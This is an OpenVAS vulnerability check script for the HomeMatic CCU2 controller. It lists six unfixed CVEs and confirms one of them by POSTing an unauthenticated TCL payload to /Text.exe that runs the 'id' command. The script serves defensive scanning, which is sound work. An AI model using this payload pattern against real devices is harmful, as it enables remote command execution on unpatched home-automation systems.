###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_homematic_mult_vuln.nasl 13838 2019-02-25 07:56:59Z mmartin $
#
# HomeMatic CCU2 Multiple Vulnerabilities
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2018 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:eq-3:homematic_ccu2";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140807");
  script_version("$Revision: 13838 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-25 08:56:59 +0100 (Mon, 25 Feb 2019) $");
  script_tag(name:"creation_date", value:"2018-02-23 16:19:23 +0700 (Fri, 23 Feb 2018)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2018-7296", "CVE-2018-7297", "CVE-2018-7298", "CVE-2018-7299", "CVE-2018-7300",
                "CVE-2018-7301");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("HomeMatic CCU2 Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_homematic_ccu2_detect.nasl");
  script_mandatory_keys("homematic/detected");

  script_tag(name:"summary", value:"HomeMatic CCU2 is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"HomeMatic CCU2 is prone to multiple vulnerabilities:

  - Directory Traversal / Arbitrary File Read in User.getLanguage method allows remote attackers to read the first
line of an arbitrary file on the CCU2's filesystem. (CVE-2018-7296)

  - Remote Code Execution in the TCL script interpreter allows remote attackers to obtain read/write access and
execute system commands on the device. (CVE-2018-7297)

  - In /usr/local/etc/config/addons/mh/loopupd.sh software update packages are downloaded via the HTTP protocol,
which does not provide any cryptographic protection of the downloaded contents. (CVE-2018-7298)

  - Remote Code Execution in the addon installation process allows authenticated attackers to create or overwrite
arbitrary files or install malicious software on the device. (CVE-2018-7299)

  - Directory Traversal / Arbitrary File Write / Remote Code Execution in the User.setLanguage method allows remote
attackers to write arbitrary files to the device's filesystem. (CVE-2018-7300)

  - Open XML-RPC port without authentication. This can be exploited by sending arbitrary XML-RPC requests to
control the attached BidCos devices. (CVE-2018-7301)");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"https://atomic111.github.io/article/homematic-ccu2-fileread");
  script_xref(name:"URL", value:"https://atomic111.github.io/article/homematic-ccu2-remote-code-execution");
  script_xref(name:"URL", value:"https://atomic111.github.io/article/homematic-ccu2-firmware-via-plain-http");
  script_xref(name:"URL", value:"https://atomic111.github.io/article/homematic-ccu2-untrusted_addon");
  script_xref(name:"URL", value:"https://atomic111.github.io/article/homematic-ccu2-filewrite");
  script_xref(name:"URL", value:"https://atomic111.github.io/article/homematic-ccu2-xml-rpc");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = '/Text.exe';

data = 'string stdout;\n' +
       'string stderr;\n' +
       'system.Exec("id", &stdout, &stderr);\n' +
       'WriteLine(stdout);';

req = http_post_req(port: port, url: url, data: data);
res = http_keepalive_send_recv(port: port, data: req);

if (res =~ 'uid=[0-9]+.*gid=[0-9]+') {
  report = "It was possible to execute the 'id' command.\n\nResult:\n" +
           egrep(pattern: 'uid=[0-9]+.*gid=[0-9]+', string: res);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
